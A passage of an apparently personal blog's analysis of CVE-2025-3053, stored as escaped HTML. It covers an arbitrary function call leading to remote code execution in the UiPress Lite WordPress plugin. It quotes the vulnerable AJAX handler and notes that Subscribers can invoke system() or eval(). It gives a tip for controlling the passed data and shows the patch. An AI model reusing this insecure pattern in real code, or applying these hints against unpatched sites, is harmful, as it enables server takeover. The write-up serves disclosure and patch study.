class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Catch&amp;ensp;function&amp;ensp;error&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;uip_process_form_input()&lt;/code&gt; function is triggered via AJAX and relies only on &lt;code&gt;Ajax::check_referer()&lt;/code&gt; to verify the nonce and confirm the request is running in the &lt;code&gt;DOING_AJAX&lt;/code&gt; context. This mechanism &lt;strong&gt;does not check the userâ€™s capability&lt;/strong&gt; with functions like &lt;code&gt;current_user_can()&lt;/code&gt;, but only validates the request. As a result, any authenticated user (Subscriber and above) can specify any valid PHP function â†’ leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$doingAjax&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;DOING_AJAX&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;DOING_AJAX&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$referer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;check_ajax_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-security-nonce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;security&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$doingAjax&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$referer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Abort&amp;ensp;if&amp;ensp;not&amp;ensp;doing&amp;ensp;ajax&amp;ensp;or&amp;ensp;bad&amp;ensp;referer&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$message&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Unable&amp;ensp;to&amp;ensp;perform&amp;ensp;action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Data from &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; is processed with &lt;code&gt;stripslashes()&lt;/code&gt; and then passed into &lt;code&gt;json_decode()&lt;/code&gt;, so &lt;code&gt;$data&lt;/code&gt; is usually a &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt; (or the corresponding data type based on the JSON content). This value is then passed through &lt;code&gt;Sanitize::clean_input_with_code()&lt;/code&gt;, which may filter data, but &lt;strong&gt;does not control function execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;If &lt;code&gt;$_POST[&amp;quot;formData&amp;quot;]&lt;/code&gt; is sent as a plain string instead of JSON (&amp;quot;{}&amp;quot;), &lt;code&gt;json_decode()&lt;/code&gt; will return a string instead of a &lt;strong&gt;&lt;code&gt;stdClass&lt;/code&gt;&lt;/strong&gt;. This allows full control over &lt;code&gt;$data&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Next, the function name is taken from &lt;code&gt;$_POST[&amp;quot;userFunction&amp;quot;]&lt;/code&gt; and only checked using &lt;code&gt;function_exists()&lt;/code&gt;. This means &lt;strong&gt;any valid PHP function existing in the WordPress/PHP environment can be called&lt;/strong&gt;, as long as the attacker knows or guesses its name.&lt;/p&gt;&#xA;&lt;p&gt;Finally, the line &lt;code&gt;$userFunction($data);&lt;/code&gt; performs a &lt;strong&gt;dynamic function call&lt;/strong&gt; with user-controlled data. Allowing users to directly control the function name without a whitelist or permission checks creates a &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; vulnerability, or at minimum an &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, enabling authenticated attackers (e.g., Subscribers) to invoke dangerous functions such as &lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;exec()&lt;/code&gt;, &lt;code&gt;shell_exec()&lt;/code&gt;, &lt;code&gt;eval()&lt;/code&gt;, etc., resulting in command execution or system manipulation.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v3.5.08):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;uip_process_form_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;security&amp;ensp;nonce&amp;ensp;and&amp;ensp;&amp;#39;DOING_AJAX&amp;#39;&amp;ensp;global&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Passing&amp;ensp;form&amp;ensp;data&amp;ensp;to&amp;ensp;user&amp;ensp;specified&amp;ensp;functions&amp;ensp;has&amp;ensp;been&amp;ensp;disabled&amp;ensp;to&amp;ensp;prevent&amp;ensp;potential&amp;ensp;security&amp;ensp;issues.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch effectively fixes the issue by removing the original logic entirely :)).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#34; title=&#34;Changes introduced in the patch&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#39; alt=&#34;Diff&#34; height=&#34;583&#34; width=&#34;1894&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced in the patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;load_ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$function_names&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_users_and_roles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_post_types&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_recent_posts&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_posts_for_table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_post_table_columns&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_delete_post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_user_preference&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_user_preference&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_search_content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_process_form_input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_send_form_email&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_form_as_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_form_as_user_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_pre_populate_form_data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_create_frame_switch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_sync_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_refresh_sync_key&amp;#34;&lt;/span&gt;&lt;span 